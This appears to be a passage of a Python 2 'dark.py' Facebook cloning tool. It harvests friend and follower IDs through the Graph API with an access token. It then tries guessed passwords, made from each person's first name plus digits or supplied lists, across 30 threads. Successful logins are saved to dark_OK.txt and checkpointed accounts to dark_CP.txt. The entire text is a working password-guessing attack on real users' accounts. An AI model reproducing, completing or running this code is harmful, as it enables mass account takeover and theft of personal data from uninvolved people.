            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass1
                cp = open('dark_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass2
                    cp = open('dark_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/output/dark_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass3
                        cp = open('dark_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/output/dark_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass4
                            cp = open('dark_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/output/dark_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass5
                                cp = open('dark_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass6
                                    cp = open('dark_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Crack Done! '
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cps))
    raw_input(w + '[' + g + '!' + w + '] Press enter to back')
    choice_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print w + '[' + red + '!' + w + '] File not Found! '
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + red + '0' + w + '} Back'
    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print 38 * '-'
    print w + '{' + g + '1' + w + '} Public ID Cloning'
    print w + '{' + g + '2' + w + '} Followers Cloning'
    print w + '{' + g + '3' + w + '} With File Cloning'
    print w + '{' + red + '0' + w + '} Back'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(w + '\xe2\x9e\x9b ')
    if a_s == '1':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '[' + g + '+' + w + '] Example : 123,1234,12345,786,12,1122'
        p1 = raw_input('\n' + w + '[' + g + '1' + w + '] Name + digit : ')
        p2 = raw_input(w + '[' + g + '2' + w + '] Name + digit : ')
        p3 = raw_input(w + '[' + g + '3' + w + '] Name + digit : ')
        p4 = raw_input(w + '[' + g + '4' + w + '] Name + digit : ')
        pass5 = raw_input(w + '[' + g + '5' + w + '] Password : ')
        pass6 = raw_input(w + '[' + g + '6' + w + '] Password : ')
        pass7 = raw_input(w + '[' + g + '7' + w + '] Password : ')
        pass8 = raw_input(w + '[' + g + '8' + w + '] Password : ')
        idt = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print 38 * '-'
            print '\n' + w + '[' + g + 'USER' + w + '] Cloning From : ' + z
        except (KeyError, IOError):
            print '\n' + w + '[' + red + '!' + w + '] Invalid User! '
            raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '[' + g + '+' + w + '] Example : 123,1234,12345,786,12,1122'
        p1 = raw_input('\n' + w + '[' + g + '1' + w + '] Name + digit : ')
        p2 = raw_input(w + '[' + g + '2' + w + '] Name + digit : ')
        p3 = raw_input(w + '[' + g + '3' + w + '] Name + digit : ')
        p4 = raw_input(w + '[' + g + '4' + w + '] Name + digit : ')
        idt = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print 38 * '-'
            print w + '[' + g + 'USER' + w + '] Cloning From : ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print 38 * '-'
        print w + '[' + g + '+' + w + '] Example : 123,1234,12345,786,12,1122'
        p1 = raw_input('\n' + w + '[' + g + '1' + w + '] Name + digit : ')
        p2 = raw_input(w + '[' + g + '2' + w + '] Name + digit : ')
        p3 = raw_input(w + '[' + g + '3' + w + '] Name + digit : ')
        p4 = raw_input(w + '[' + g + '4' + w + '] Name + digit : ')
        pass5 = raw_input(w + '[' + g + '5' + w + '] Password : ')
        pass6 = raw_input(w + '[' + g + '6' + w + '] Password : ')
        pass7 = raw_input(w + '[' + g + '7' + w + '] Password : ')
        pass8 = raw_input(w + '[' + g + '8' + w + '] Password : ')
        try:
            idlist = raw_input(w + '[' + g + 'INPUT' + w + '] Input File : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print w + '[' + red + '!' + w + '] File not Found! '
            raw_input(w + '[' + g + '!' + w + '] Press enter to back! ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print w + '[' + red + '!' + w + '] Wrong Input'
        time.sleep(1)
        menu()
    print w + '[' + g + '>' + w + '] Total ID : ' + str(len(id))
    time.sleep(0.5)
    print w + '[' + g + '\xe2\x80\xa2' + w + '] Crack Running\n'
    time.sleep(0.5)

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/output/dark_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass1
                cp = open('dark_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass2
                    cp = open('dark_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/output/dark_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass3
                        cp = open('dark_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/output/dark_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass4
                            cp = open('dark_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/output/dark_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass5
                                cp = open('dark_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/output/dark_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass6
                                    cp = open('dark_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/output/dark_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass7
                                        cp = open('dark_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;97m[\x1b[1;32mOK\x1b[1;97m] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/output/dark_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\x1b[1;97m] ' + uid + ' | ' + pass8
                                            cp = open('dark_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 38 * '-'
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Crack Done! '
    print w + '[' + g + '\xe2\x9c\x94' + w + '] Total OK/CP ' + str(len(oks)) + '/' + str(len(cps))
    xbb = raw_input(w + '[' + g + '!' + w + '] Press enter to back! ')
    auto_crack()


def ex_id():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print w + '[' + red + '!' + w + '] Token Not Found! '
        time.sleep(1)
        os.system('python2 dark.py')

    os.system('clear')
    print logo
    print 38 * '-'
    idh = raw_input('\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print '\n' + w + '[' + g + 'USER' + w + '] Enter ID  :  ' + q['name'] + '\n'
    except KeyError:
        print logo
        print w + '[' + red + '!' + w + '] Login ID has Checkpoint! '
        raw_input(w + '[' + red + '!' + w + '] Press enter to back! ')
        crack()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('Extract_IDS.txt', 'a+')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print 38 * '-'
    print ''
    print w + '[' + red + '!' + w + '] Token Not Found! '
    print w + '[' + g + '>' + w + '] Total ID  : ' + str(len(idg))
    print 38 * '-'
    os.system('cp Extract_IDS.txt /sdcard')
    os.system('rm -rf Extract_IDS.txt')
    time.sleep(1)
    ex_id()


if __name__ == '__main__':
    loading()
    log_menu()
